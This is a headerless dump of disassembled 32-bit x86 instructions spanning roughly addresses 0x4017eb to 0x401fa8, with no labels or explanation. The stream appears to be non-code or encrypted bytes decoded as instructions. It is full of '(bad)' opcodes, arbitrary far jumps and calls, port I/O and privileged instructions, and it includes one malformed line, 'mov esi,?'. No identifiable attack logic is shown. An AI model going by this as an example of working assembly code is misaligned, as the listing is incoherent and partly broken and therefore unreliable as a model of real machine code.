  4017eb:	and    BYTE PTR [eax+0x1a],bl
  4017ee:	stos   BYTE PTR es:[edi],al
  4017ef:	xchg   ebx,eax
  4017f0:	push   ebp
  4017f1:	adc    al,0x4d
  4017f3:	sar    DWORD PTR [edx+0x448b08fb],0xc
  4017fa:	xchg   ebp,eax
  4017fb:	jmp    0x7dd7:0x9fbb05ef
  401802:	jns    0x4017ef
  401804:	hlt    
  401805:	push   edx
  401806:	pushf  
  401807:	xor    al,0x0
  401809:	push   ecx
  40180a:	cmp    al,0xa5
  40180c:	loope  0x40184c
  40180e:	rcl    DWORD PTR [eax+eax*8-0x27],cl
  401812:	addr16 test al,0xf
  401815:	cwde   
  401816:	lods   eax,DWORD PTR ds:[esi]
  401817:	and    eax,0xc619640a
  40181c:	cmp    DWORD PTR [edi-0x67086bcf],0xffffffa1
  401823:	sub    BYTE PTR [edx+0x6367f6f3],ch
  401829:	or     al,0x3e
  40182b:	hlt    
  40182c:	sbb    ecx,0xffffff94
  40182f:	or     al,0xe9
  401831:	mov    WORD PTR [ebp+0x4b],gs
  401834:	mov    edi,0x9fda3c1e
  401839:	inc    eax
  40183a:	int3   
  40183b:	mov    cl,0xb2
  40183d:	pop    es
  40183e:	loope  0x4017f1
  401840:	xchg   esp,eax
  401841:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401842:	mov    eax,ds:0xdc04495c
  401847:	pop    ds
  401848:	out    dx,eax
  401849:	xchg   ebx,eax
  40184a:	lea    esp,[esi]
  40184c:	cmp    al,BYTE PTR [eax-0xd6ca9d3]
  401852:	mov    cl,0x86
  401854:	test   BYTE PTR [ebp+0x4549df0e],bh
  40185a:	loopne 0x4018ae
  40185c:	hlt    
  40185d:	xchg   esp,eax
  40185e:	inc    ecx
  40185f:	es pop ecx
  401861:	in     eax,0xb8
  401863:	jmp    0x68da:0xf4ba2009
  40186a:	test   BYTE PTR [esi+0x1b],bh
  40186d:	call   0xd944:0x5bdde506
  401874:	je     0x401871
  401876:	xlat   BYTE PTR ds:[ebx]
  401877:	push   ebx
  401878:	sbb    BYTE PTR [eax+edi*4],0x20
  40187c:	pop    ebx
  40187d:	and    eax,0xfe6e75bf
  401882:	push   ds
  401883:	xchg   ebp,eax
  401884:	mov    al,ds:0xdc3533e1
  401889:	jb     0x401821
  40188b:	(bad)  
  40188c:	int    0xf0
  40188e:	clc    
  40188f:	mov    ecx,0xa2ae1458
  401894:	and    eax,0x6f2b9608
  401899:	je     0x401875
  40189b:	or     ecx,DWORD PTR [edi]
  40189d:	fidivr WORD PTR [ecx]
  40189f:	cdq    
  4018a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018a1:	neg    DWORD PTR ds:0xd4c910f0
  4018a7:	imul   ebx,esi,0x6a
  4018aa:	or     eax,0x7284bb8d
  4018af:	fbld   TBYTE PTR [eax]
  4018b1:	cli    
  4018b2:	stos   DWORD PTR es:[edi],eax
  4018b3:	sbb    DWORD PTR [esi],ecx
  4018b5:	cmp    bh,BYTE PTR [edx-0x7cc13ace]
  4018bb:	jb     0x401859
  4018bd:	jne    0x401933
  4018bf:	add    cl,BYTE PTR [ebp-0x24]
  4018c2:	and    al,0x68
  4018c4:	enter  0x1100,0xa7
  4018c8:	gs sub al,0xe2
  4018cb:	cmp    ebp,DWORD PTR ds:0xf2496767
  4018d1:	add    al,0xc0
  4018d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4018d4:	sbb    BYTE PTR [ebp-0x64],dl
  4018d7:	inc    edi
  4018d8:	inc    esi
  4018d9:	mov    esi,0x2dc1c498
  4018de:	mov    edx,0xf0ac313f
  4018e3:	jmp    0xe166:0xe608f776
  4018ea:	cmp    DWORD PTR [ecx+edx*1+0xddcffc4],eax
  4018f1:	idiv   cl
  4018f3:	in     al,dx
  4018f4:	mov    dl,dl
  4018f6:	cmp    al,0x36
  4018f8:	lahf   
  4018f9:	test   BYTE PTR [eax+edx*8],ch
  4018fc:	cmp    eax,ecx
  4018fe:	push   edi
  4018ff:	call   0x2a67b2d6
  401904:	push   ds
  401905:	pop    eax
  401906:	cmp    esp,ebx
  401908:	aam    0x13
  40190a:	ret    
  40190b:	pushf  
  40190c:	popf   
  40190d:	add    eax,0x474ce9
  401912:	fiadd  DWORD PTR [edx-0x32]
  401915:	int3   
  401916:	lock into 
  401918:	sbb    BYTE PTR ds:[ebx-0x1f881e21],ch
  40191f:	or     bl,BYTE PTR [esi]
  401921:	dec    ebp
  401922:	mov    bh,0xbe
  401924:	mov    sp,0x2dc6
  401928:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401929:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40192a:	pop    es
  40192b:	sar    BYTE PTR [esi],1
  40192d:	jle    0x401955
  40192f:	sar    DWORD PTR [edx-0x2b],1
  401932:	dec    ecx
  401933:	enter  0x5ec7,0x91
  401937:	aad    0x83
  401939:	sbb    eax,0x23267c96
  40193e:	test   eax,0xe4f88c9f
  401943:	fsub   QWORD PTR [edi]
  401945:	adc    al,0xcc
  401947:	call   0xe8fc3325
  40194c:	ins    DWORD PTR es:[edi],dx
  40194d:	fdivrp st(6),st
  40194f:	pop    eax
  401950:	call   0x8d7b26fb
  401955:	cmp    cl,BYTE PTR [ebp-0xe]
  401958:	jb     0x4019d7
  40195a:	sbb    DWORD PTR [ebp+0x5d467583],0x512df70f
  401964:	test   DWORD PTR [edi],0x7ad4a55
  40196a:	adc    ch,BYTE PTR [edx]
  40196c:	xchg   al,ch
  40196e:	jl     0x4019b7
  401970:	mov    al,BYTE PTR [edx+0x4b]
  401973:	xlat   BYTE PTR ds:[ebx]
  401974:	sub    cl,BYTE PTR [esi]
  401976:	xchg   ebp,eax
  401977:	and    ah,dl
  401979:	cs jecxz 0x4019d1
  40197c:	sbb    BYTE PTR [ecx],ah
  40197e:	inc    eax
  40197f:	sub    al,bl
  401981:	mov    al,0x9a
  401983:	jge    0x40191b
  401985:	mov    ecx,0xaceb7307
  40198a:	fiadd  WORD PTR ds:[edx-0x4ba61ee1]
  401991:	rcl    DWORD PTR [ebx-0xb6bacdc],0xc
  401998:	mov    ch,0xcf
  40199a:	dec    ebp
  40199b:	push   es
  40199c:	push   0x2b4fb152
  4019a1:	and    bl,BYTE PTR [edi+0x47]
  4019a4:	iret   
  4019a5:	add    DWORD PTR [edx-0x7337722],edx
  4019ab:	sahf   
  4019ac:	int3   
  4019ad:	or     al,0x8a
  4019af:	in     eax,dx
  4019b0:	jb     0x401a05
  4019b2:	les    edx,FWORD PTR [edx-0x56]
  4019b5:	mov    ds:0xd9e63e4f,al
  4019ba:	call   0xaff2dc83
  4019bf:	fs dec ebx
  4019c1:	adc    ecx,ebx
  4019c3:	jne    0x40199f
  4019c5:	loopne 0x40195d
  4019c7:	mov    dl,BYTE PTR [ebx-0xd]
  4019ca:	xchg   DWORD PTR [ebx+eiz*4-0x50367949],ebx
  4019d1:	inc    esi
  4019d2:	cmp    eax,0xd2c840a7
  4019d7:	add    ah,BYTE PTR [eax+edx*8-0x1f]
  4019db:	mov    dh,0x6c
  4019dd:	stos   DWORD PTR es:[edi],eax
  4019de:	(bad)  
  4019df:	shl    esp,cl
  4019e1:	ds loope 0x4019f9
  4019e4:	inc    edi
  4019e5:	jmp    eax
  4019e7:	out    0xc3,eax
  4019e9:	sub    eax,0xc9d6971a
  4019ee:	fucom  st(6)
  4019f0:	dec    esp
  4019f1:	cmp    al,0x96
  4019f3:	shl    BYTE PTR [ebp+0xf67b5a0],1
  4019f9:	arpl   WORD PTR [ecx+0x4be33843],di
  4019ff:	and    esp,DWORD PTR [ecx+0x5a]
  401a02:	xor    dh,BYTE PTR [edx-0x124b237b]
  401a08:	pop    ds
  401a09:	push   es
  401a0a:	push   0x1f
  401a0c:	cmp    esi,DWORD PTR cs:[ecx]
  401a0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a10:	(bad)  
  401a11:	sub    cl,al
  401a13:	add    dl,BYTE PTR [ebp-0x22]
  401a16:	lahf   
  401a17:	cmp    dh,bl
  401a19:	and    ch,ah
  401a1b:	ret    0xa606
  401a1e:	and    esp,ebx
  401a20:	lahf   
  401a21:	stc    
  401a22:	push   edi
  401a23:	cmp    DWORD PTR [ebx-0x2e],ecx
  401a26:	ins    DWORD PTR es:[edi],dx
  401a27:	mov    edi,0x92d9e708
  401a2c:	inc    edx
  401a2d:	cmc    
  401a2e:	mov    esi,ebx
  401a30:	dec    ebp
  401a31:	xchg   ebx,eax
  401a32:	fdiv   st,st(7)
  401a34:	mov    edx,0x2c641f46
  401a39:	xor    esp,esp
  401a3b:	les    eax,FWORD PTR [esi-0x5c]
  401a3e:	popf   
  401a3f:	out    0xc5,eax
  401a41:	pushf  
  401a42:	out    0xae,eax
  401a44:	jbe    0x4019d1
  401a46:	mov    edx,0x46879d51
  401a4b:	add    BYTE PTR ds:0x58dae20e,ah
  401a51:	and    bl,0x53
  401a54:	adc    esp,DWORD PTR [esi+0x4091f316]
  401a5a:	dec    esp
  401a5b:	pop    ebx
  401a5c:	fadd   DWORD PTR [ebp-0x66]
  401a5f:	je     0x401a9e
  401a61:	loope  0x401a2b
  401a63:	cmp    eax,0x63ddcdd7
  401a68:	inc    esp
  401a69:	mov    eax,fs:0xdedf0445
  401a6f:	sahf   
  401a70:	push   ecx
  401a71:	hlt    
  401a72:	js     0x401ae0
  401a74:	in     eax,dx
  401a75:	popa   
  401a76:	out    0xf6,al
  401a78:	jmp    ecx
  401a7a:	call   DWORD PTR [ecx]
  401a7c:	inc    edx
  401a7d:	mov    bl,0x2b
  401a7f:	adc    eax,DWORD PTR [bp-0x4fb4]
  401a84:	sub    edx,DWORD PTR [eax-0x1f]
  401a87:	cmp    al,0xbf
  401a89:	pop    edx
  401a8a:	ret    0x3d1f
  401a8d:	sahf   
  401a8e:	mov    cs,ecx
  401a90:	clc    
  401a91:	lods   eax,DWORD PTR ds:[esi]
  401a92:	xor    al,0x84
  401a94:	jmp    0x401a95
  401a96:	pop    esp
  401a97:	xchg   esp,eax
  401a98:	das    
  401a99:	les    edi,FWORD PTR [ebp+edi*2-0x51]
  401a9d:	inc    ecx
  401a9e:	push   ss
  401a9f:	or     bh,BYTE PTR [edi+0x1a]
  401aa2:	xchg   BYTE PTR [ebx+0x18],al
  401aa5:	lock mov BYTE PTR [edi+0x4b],al
  401aa9:	ret    
  401aaa:	xchg   esp,eax
  401aab:	(bad)  
  401aac:	and    bl,dh
  401aae:	lea    ecx,[ebp-0x15]
  401ab1:	mov    ah,0x71
  401ab3:	call   0x34d5:0xdfa03440
  401aba:	ret    
  401abb:	dec    ebp
  401abc:	or     al,0x1e
  401abe:	iret   
  401abf:	adc    BYTE PTR [esi+0x3ae8e879],cl
  401ac5:	mov    esi,0x1f940180
  401aca:	jmp    0x401b16
  401acc:	add    BYTE PTR ds:0xaed8cd7f,0xa4
  401ad3:	sbb    DWORD PTR [eax+0x2d],ecx
  401ad6:	mov    bl,BYTE PTR [esi-0x499f03c3]
  401adc:	js     0x401af6
  401ade:	div    BYTE PTR [eax]
  401ae0:	sub    edx,DWORD PTR [ecx-0x5f]
  401ae3:	sti    
  401ae4:	mov    esi,0xd221d25a
  401ae9:	addr16 push ss
  401aeb:	xlat   BYTE PTR ds:[ebx]
  401aec:	sub    BYTE PTR [ebx+0x11],ah
  401aef:	call   FWORD PTR [edi+0x3f]
  401af2:	adc    ah,BYTE PTR [esi+0x6b]
  401af5:	sub    bh,BYTE PTR [esi]
  401af7:	clc    
  401af8:	test   al,0x6f
  401afa:	adc    ecx,DWORD PTR [esi-0x17]
  401afd:	aad    0x4f
  401aff:	add    eax,0x76df16
  401b04:	(bad)  
  401b05:	mov    ecx,0x26f89234
  401b0a:	add    al,0x28
  401b0c:	or     ch,bh
  401b0e:	test   eax,0x95763331
  401b13:	push   edi
  401b14:	push   cs
  401b15:	push   esi
  401b16:	pavgw  mm7,QWORD PTR [eax-0x7a]
  401b1a:	out    0xbf,al
  401b1c:	out    0xa2,al
  401b1e:	js     0x401b22
  401b20:	aam    0x46
  401b22:	mov    ebx,0x40bc3cf6
  401b27:	fnstsw WORD PTR [esi-0x21]
  401b2a:	adc    ah,ch
  401b2c:	xchg   ebp,eax
  401b2d:	retf   0x510b
  401b30:	nop
  401b31:	sahf   
  401b32:	mov    bl,0x8d
  401b34:	call   0x469608a0
  401b39:	cmp    BYTE PTR [edx-0x65],al
  401b3c:	loopne 0x401bb5
  401b3e:	in     al,dx
  401b3f:	lahf   
  401b40:	mov    dl,0x5c
  401b42:	rcl    edx,0x29
  401b45:	fldcw  WORD PTR [edi+0x7c]
  401b48:	cmp    eax,0x88fc0135
  401b4d:	(bad)  
  401b4e:	popa   
  401b4f:	xchg   esp,ebp
  401b51:	pop    ebx
  401b52:	add    DWORD PTR [edx+0x44],0xf093656b
  401b59:	inc    edi
  401b5a:	mov    al,ds:0xfbc96a26
  401b5f:	fst    QWORD PTR [esi+0x53]
  401b62:	xchg   esp,eax
  401b63:	add    al,0x97
  401b65:	mov    ah,BYTE PTR [eax-0xed91220]
  401b6b:	xor    eax,0x30a89e8c
  401b70:	mov    ah,0x32
  401b72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b73:	xor    dh,dh
  401b75:	adc    ah,BYTE PTR [edx-0x1807b0c5]
  401b7b:	mov    ch,0x6a
  401b7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b7e:	sub    BYTE PTR [ecx-0x55e9fe75],cl
  401b84:	in     al,0xc
  401b86:	ss leave 
  401b88:	(bad)  
  401b89:	outs   dx,DWORD PTR ds:[esi]
  401b8a:	inc    ecx
  401b8b:	addr16 loope 0x401bb9
  401b8e:	push   0xa8efeced
  401b93:	sub    edi,ecx
  401b95:	adc    eax,0xc0f6f5a
  401b9a:	loop   0x401b9b
  401b9c:	(bad)  
  401b9d:	in     eax,0x2f
  401b9f:	aas    
  401ba0:	cmc    
  401ba1:	fsub   st(2),st
  401ba3:	jne    0x401be7
  401ba5:	bound  esp,QWORD PTR [esi]
  401ba7:	inc    edx
  401ba8:	inc    ebp
  401ba9:	ss jl  0x401b55
  401bac:	jnp    0x401bd9
  401bae:	mov    bh,0xd7
  401bb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bb1:	clc    
  401bb2:	fst    QWORD PTR [esi-0x48]
  401bb5:	mul    al
  401bb7:	(bad)  
  401bb8:	jae    0x401c1c
  401bba:	pop    ss
  401bbb:	add    ah,dl
  401bbd:	in     eax,dx
  401bbe:	jmp    0x401bfe
  401bc0:	or     al,bl
  401bc2:	fwait
  401bc3:	push   ds
  401bc4:	call   0xe767:0xbae3149d
  401bcb:	sub    ebp,edi
  401bcd:	pop    edx
  401bce:	call   0x9aac:0xf5cf7a83
  401bd5:	or     eax,0x625bef74
  401bda:	jmp    0x401bad
  401bdc:	repz xor DWORD PTR [ebx+ebp*8],esp
  401be0:	cmp    dl,bl
  401be2:	sar    bh,1
  401be4:	pop    edi
  401be5:	addr16 jb 0x401c11
  401be8:	cmp    DWORD PTR [edx],esp
  401bea:	lods   al,BYTE PTR ds:[esi]
  401beb:	dec    ebx
  401bec:	jb     0x401b75
  401bee:	mov    edi,0x5f8cc4dc
  401bf3:	es test al,0xa2
  401bf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bf8:	(bad)  
  401bf9:	lods   al,BYTE PTR ds:[esi]
  401bfa:	rcl    DWORD PTR cs:[esi],cl
  401bfd:	or     BYTE PTR [eax-0x2f],ch
  401c00:	pop    edi
  401c01:	adc    eax,0xfb20e021
  401c06:	ror    BYTE PTR ds:0x6dbab5ba,1
  401c0c:	pushf  
  401c0d:	and    dh,BYTE PTR [ebp-0x1a9271fd]
  401c13:	mov    edx,ebp
  401c15:	das    
  401c16:	ret    0x8c38
  401c19:	out    0xc3,eax
  401c1b:	int    0x31
  401c1d:	mov    BYTE PTR [edx-0x1c45c7fb],bl
  401c23:	(bad)  
  401c24:	mov    ds:0x9e442d5d,al
  401c29:	lods   al,BYTE PTR ds:[esi]
  401c2a:	jecxz  0x401bc8
  401c2c:	(bad)  
  401c2e:	sub    BYTE PTR [esi+eiz*1+0x1],cl
  401c32:	push   edx
  401c33:	(bad)  
  401c34:	std    
  401c35:	aaa    
  401c36:	sub    BYTE PTR [ecx+0x42196df1],bh
  401c3c:	dec    ebx
  401c3d:	or     eax,0xe48b4c5b
  401c42:	jp     0x401bfa
  401c44:	cdq    
  401c45:	(bad)  
  401c46:	ror    ecx,1
  401c48:	cwde   
  401c49:	adc    esp,DWORD PTR [ebp+eax*4+0x8]
  401c4d:	mov    edi,0x942b8b2d
  401c52:	push   edx
  401c53:	xchg   edi,eax
  401c54:	out    dx,al
  401c55:	in     al,0x63
  401c57:	dec    DWORD PTR [ebx+0x36]
  401c5a:	xchg   esp,eax
  401c5b:	outs   dx,DWORD PTR ds:[esi]
  401c5c:	mov    ds:0x4827b0ff,al
  401c61:	in     al,dx
  401c62:	cmc    
  401c63:	pop    ecx
  401c64:	jl     0x401cab
  401c66:	sub    DWORD PTR [ebp+0x6a],0xfffffffa
  401c6a:	mov    ebx,0x72b74e34
  401c70:	jno    0x401c09
  401c72:	lods   al,BYTE PTR ds:[esi]
  401c73:	mov    eax,0x65e574c1
  401c78:	sbb    DWORD PTR [ebp-0x6a230e34],0xffffff94
  401c7f:	iret   
  401c80:	push   eax
  401c81:	jge    0x401c79
  401c83:	call   0x9fc6:0xd117a638
  401c8a:	lods   al,BYTE PTR ds:[esi]
  401c8b:	js     0x401cb3
  401c8d:	mov    esp,0xee816667
  401c92:	mov    esp,ss
  401c94:	pop    esi
  401c95:	cmp    al,0x97
  401c98:	xchg   DWORD PTR [eax-0x74],ecx
  401c9b:	adc    esi,edi
  401c9d:	xchg   edx,eax
  401c9e:	sbb    edi,DWORD PTR fs:[esi]
  401ca1:	mov    ebp,0x37fb2a38
  401ca6:	adc    al,0xbf
  401ca8:	pop    edi
  401ca9:	sub    esi,DWORD PTR [esi+edx*8+0x69]
  401cad:	aas    
  401cae:	jmp    0x401cf4
  401cb0:	in     eax,0x91
  401cb2:	pop    ss
  401cb3:	xchg   ebx,eax
  401cb4:	stos   BYTE PTR es:[edi],al
  401cb5:	mov    eax,ds:0x12d7a3b
  401cba:	and    DWORD PTR [esi+ebp*8],edi
  401cbd:	in     al,0xe0
  401cbf:	adc    ebx,DWORD PTR [ecx]
  401cc1:	mov    eax,0x8fc28bd9
  401cc6:	or     bh,BYTE PTR [ecx-0x70]
  401cc9:	sbb    al,BYTE PTR [eax-0x51]
  401ccc:	jmp    0x5ce64d96
  401cd1:	shl    DWORD PTR [ebp+0x78],1
  401cd4:	in     eax,0xf9
  401cd6:	fs sbb eax,0xd430b564
  401cdc:	mov    eax,ds:0x4fcc2b91
  401ce1:	aam    0x58
  401ce3:	sub    eax,0xa25f9807
  401ce8:	push   esi
  401ce9:	jnp    0x401c76
  401ceb:	push   ss
  401cec:	and    BYTE PTR [ecx-0x75],cl
  401cef:	cmp    eax,0x19f2ece9
  401cf4:	jno    0x401ce4
  401cf6:	sbb    BYTE PTR [esi],0x35
  401cf9:	cmp    BYTE PTR ds:0x3d19c9e,0x79
  401d00:	test   al,dl
  401d02:	sbb    eax,ebx
  401d04:	adc    al,0xfa
  401d06:	fwait
  401d07:	in     eax,dx
  401d08:	sti    
  401d09:	sahf   
  401d0a:	and    al,0x65
  401d0c:	dec    esp
  401d0d:	mov    esi,0xc4543cd0
  401d12:	and    ebp,eax
  401d14:	into   
  401d15:	lahf   
  401d16:	jp     0x401d05
  401d18:	inc    ebx
  401d19:	jno    0x401cad
  401d1b:	imul   edx,DWORD PTR [esi+0x323d524],0xeb568e7b
  401d25:	mul    al
  401d27:	popf   
  401d28:	sbb    eax,0xd75f8067
  401d2d:	ds mov dh,0x22
  401d30:	(bad)  
  401d31:	pop    es
  401d32:	and    dh,dh
  401d34:	loopne 0x401cf0
  401d36:	xor    dh,al
  401d38:	add    al,0xa6
  401d3a:	mov    al,0x21
  401d3c:	add    DWORD PTR [edx+0x77864c72],ebx
  401d42:	setb   BYTE PTR [esi+0x6ae6c57c]
  401d49:	call   0xd02e:0x1ea180b5
  401d50:	out    0x66,al
  401d52:	enter  0x577c,0xf2
  401d56:	sbb    DWORD PTR [ecx-0x52],esp
  401d59:	mov    dl,0x99
  401d5b:	and    DWORD PTR [edi+0x5343c1a],edi
  401d61:	call   0x77f29399
  401d66:	jnp    0x401d30
  401d68:	cmp    BYTE PTR [ebp-0x1e059288],ah
  401d6e:	(bad)  
  401d6f:	fstp   TBYTE PTR [ebx+0x676b53a7]
  401d75:	fisub  WORD PTR ds:0x9bfa2d58
  401d7b:	ret    
  401d7c:	addr16 sub al,0x81
  401d7f:	scas   eax,DWORD PTR es:[edi]
  401d80:	dec    ebx
  401d81:	stos   BYTE PTR es:[edi],al
  401d82:	inc    edi
  401d83:	outs   dx,BYTE PTR ds:[esi]
  401d84:	push   0xffffff9a
  401d86:	jae    0x401e00
  401d88:	es pop eax
  401d8a:	inc    esp
  401d8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d8c:	xchg   BYTE PTR [ecx],al
  401d8e:	jge    0x401dac
  401d90:	dec    edi
  401d91:	std    
  401d92:	hlt    
  401d93:	and    esi,DWORD PTR ds:[eax+0x4cb25661]
  401d9a:	mov    ch,0x42
  401d9c:	xor    bl,0x84
  401d9f:	pop    eax
  401da0:	mov    edx,0xe74c62e8
  401da5:	sub    DWORD PTR [ebp+0x742852c],edi
  401dab:	jb     0x401e23
  401dad:	xchg   ebx,eax
  401dae:	test   al,0xc9
  401db0:	lods   eax,DWORD PTR ds:[esi]
  401db1:	into   
  401db2:	(bad)  
  401db3:	lds    edx,FWORD PTR [edi+eiz*4-0x2ea76c5c]
  401dba:	sub    BYTE PTR [ebx-0x6f],bh
  401dbd:	shl    BYTE PTR [edx+0x28],0x3f
  401dc1:	sbb    edi,DWORD PTR [edi+edx*1+0x10a88500]
  401dc8:	pop    esp
  401dc9:	out    0x0,al
  401dcb:	or     al,0x1e
  401dcd:	retf   
  401dce:	ss jb  0x401dfd
  401dd1:	rcr    BYTE PTR [ebx-0x10bfddf6],cl
  401dd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401dd8:	loop   0x401e08
  401dda:	popa   
  401ddb:	adc    al,0x10
  401ddd:	and    dh,ch
  401ddf:	pop    ecx
  401de0:	and    ch,bl
  401de2:	jno    0x401d68
  401de4:	out    0xa1,al
  401de6:	xor    ecx,edi
  401de8:	or     BYTE PTR [eax+ecx*1-0x69],al
  401dec:	fwait
  401ded:	shr    BYTE PTR [edi-0x52],0xc5
  401df1:	pop    eax
  401df2:	fist   WORD PTR [eax+0x7b]
  401df5:	adc    bl,BYTE PTR ss:[edi-0x22]
  401df9:	push   ebp
  401dfa:	int3   
  401dfb:	sbb    BYTE PTR [ebx+0x49],cl
  401dfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401dff:	dec    esi
  401e00:	cmc    
  401e01:	aaa    
  401e02:	jns    0x401d95
  401e04:	jg     0x401e82
  401e06:	push   esi
  401e07:	dec    ebx
  401e08:	add    al,0xb1
  401e0a:	scas   al,BYTE PTR es:[edi]
  401e0b:	stos   BYTE PTR es:[edi],al
  401e0c:	ss mov ch,0xa6
  401e0f:	fldcw  WORD PTR [ebx-0x68e4f4d4]
  401e15:	mov    bh,0xf5
  401e17:	pop    esi
  401e18:	sti    
  401e19:	sbb    bl,BYTE PTR [ecx]
  401e1b:	iret   
  401e1c:	and    ah,BYTE PTR [ecx+0x864614a]
  401e22:	pop    edi
  401e23:	cs iret 
  401e25:	fistp  QWORD PTR [ebp-0x52]
  401e28:	xchg   DWORD PTR [edi+ebp*8-0x40536dd3],esi
  401e2f:	xchg   esp,eax
  401e30:	push   ebp
  401e31:	adc    ch,BYTE PTR [ebp-0x24634eab]
  401e37:	jmp    0x444c:0x9d06e6b3
  401e3e:	push   ecx
  401e3f:	cmp    BYTE PTR [ecx-0x3b3c1cdd],ch
  401e45:	sub    bl,dh
  401e47:	mov    esi,DWORD PTR [edi+0xb58b308]
  401e4d:	jbe    0x401e6c
  401e4f:	mov    eax,ds:0xb8a9f5db
  401e54:	lods   eax,DWORD PTR ds:[esi]
  401e55:	aad    0x90
  401e57:	and    eax,0x82bf1ec9
  401e5c:	mov    ebx,0x7c4c6665
  401e61:	enter  0xc94b,0x89
  401e65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e66:	cmc    
  401e67:	fstp   QWORD PTR [eax+ecx*2]
  401e6a:	mov    dh,0xfc
  401e6c:	xchg   edi,eax
  401e6d:	ror    edx,cl
  401e6f:	hlt    
  401e70:	jmp    0x401e22
  401e72:	mov    bh,0xde
  401e74:	pop    edx
  401e75:	stos   DWORD PTR es:[edi],eax
  401e76:	hlt    
  401e77:	enter  0x956d,0x52
  401e7b:	cld    
  401e7c:	fwait
  401e7d:	mov    ecx,0xf9d4f81
  401e82:	mov    eax,0x53b93073
  401e87:	xchg   DWORD PTR [edi-0x1c02704c],ecx
  401e8d:	test   eax,0xd3fc9a76
  401e92:	dec    edx
  401e93:	imul   ebx,DWORD PTR [ebp-0x25],0xff7872d2
  401e9a:	and    DWORD PTR [eax-0x235662a],edi
  401ea0:	cmp    eax,0x1c885bf3
  401ea5:	dec    edi
  401ea6:	and    eax,0x155dedb9
  401eab:	dec    ebp
  401eac:	pop    ebx
  401ead:	cmp    ch,BYTE PTR [ebp-0xe]
  401eb0:	pop    ebx
  401eb1:	ret    0xcc0c
  401eb4:	push   es
  401eb5:	lock imul BYTE PTR ds:[edi+0x3d136040]
  401ebd:	retf   0x9322
  401ec0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ec1:	iret   
  401ec2:	ss in  eax,0xb6
  401ec5:	push   ebp
  401ec6:	lds    ebp,FWORD PTR [eax+0x51dffd8]
  401ecc:	or     cl,BYTE PTR ss:[ecx]
  401ecf:	icebp  
  401ed0:	or     ah,BYTE PTR [ecx-0x52d966e]
  401ed6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ed7:	adc    DWORD PTR [ecx-0x50f7849e],ebp
  401edd:	cmc    
  401ede:	adc    al,0x19
  401ee0:	fsub   QWORD PTR [edx+0x6a6405c1]
  401ee6:	xor    BYTE PTR [ecx-0x26],bh
  401ee9:	mov    esp,0xfdfbe051
  401eee:	sbb    dl,BYTE PTR [ecx]
  401ef0:	fisttp DWORD PTR [ecx]
  401ef2:	ffree  st(4)
  401ef4:	pop    es
  401ef5:	scas   al,BYTE PTR es:[edi]
  401ef6:	xchg   ebx,eax
  401ef7:	adc    BYTE PTR [ebp-0x47a7cbfe],0x5c
  401efe:	xchg   DWORD PTR [ecx],ecx
  401f00:	fsubr  DWORD PTR [esi-0x3d]
  401f03:	ret    
  401f04:	hlt    
  401f05:	and    eax,0x7c7b52c4
  401f0a:	jno    0x401e8d
  401f0c:	or     dl,0x8e
  401f0f:	sbb    dl,bl
  401f11:	mov    dh,ah
  401f13:	mov    bl,0x7
  401f15:	repnz arpl WORD PTR [edx+edx*8-0x76],si
  401f1a:	fdiv   st,st(6)
  401f1c:	(bad)  
  401f1d:	mov    ebx,0xba2c7afd
  401f22:	push   0xfffffffc
  401f24:	aam    0x8
  401f26:	pop    ecx
  401f27:	add    al,0x25
  401f29:	push   es
  401f2a:	mov    bh,0xe4
  401f2c:	idiv   BYTE PTR [ebx]
  401f2e:	ret    0x7f95
  401f31:	dec    eax
  401f32:	inc    eax
  401f33:	mov    ch,0xc
  401f35:	mov    esi,?
  401f37:	jb     0x401fa6
  401f39:	cmp    DWORD PTR [ebx+0x3e52298d],eax
  401f3f:	jmp    0x401f6c
  401f41:	cmp    edx,DWORD PTR [edi-0x67]
  401f44:	fs jbe 0x401f16
  401f47:	scas   al,BYTE PTR es:[edi]
  401f48:	pop    ds
  401f49:	mov    bh,0xba
  401f4b:	push   ebx
  401f4c:	(bad)  
  401f4e:	test   DWORD PTR [ebx-0x16],ebx
  401f51:	mov    al,0x49
  401f53:	mov    ds:0x15a54784,eax
  401f58:	mul    BYTE PTR [ebx-0x55]
  401f5b:	fs jmp 0xd784:0xaceabfd1
  401f63:	mov    al,BYTE PTR [ebp-0x69]
  401f66:	sub    esi,edi
  401f68:	or     eax,0x723fcf07
  401f6d:	ins    DWORD PTR es:[edi],dx
  401f6e:	fcomp  DWORD PTR [eax]
  401f70:	lds    edx,FWORD PTR [edi-0x74]
  401f73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f74:	ror    BYTE PTR [eax],1
  401f76:	stc    
  401f77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f78:	stos   DWORD PTR es:[edi],eax
  401f79:	call   0x82c:0x47121fe5
  401f80:	push   esp
  401f81:	mov    bh,0xa8
  401f83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f84:	mov    gs,WORD PTR [ecx+0x584b91d7]
  401f8a:	pop    esi
  401f8b:	xchg   BYTE PTR [edx+0x36],dl
  401f8e:	mov    esi,0xbddb0403
  401f93:	push   esp
  401f94:	shl    eax,0xae
  401f97:	pop    esp
  401f98:	or     BYTE PTR [ecx],al
  401f9a:	cmp    BYTE PTR [ebx-0x7e84ef3d],al
  401fa0:	popa   
  401fa1:	out    dx,al
  401fa2:	das    
  401fa3:	jl     0x401fdf
  401fa5:	loopne 0x401ff7
  401fa7:	stos   DWORD PTR es:[edi],eax
  401fa8:	dec    eax
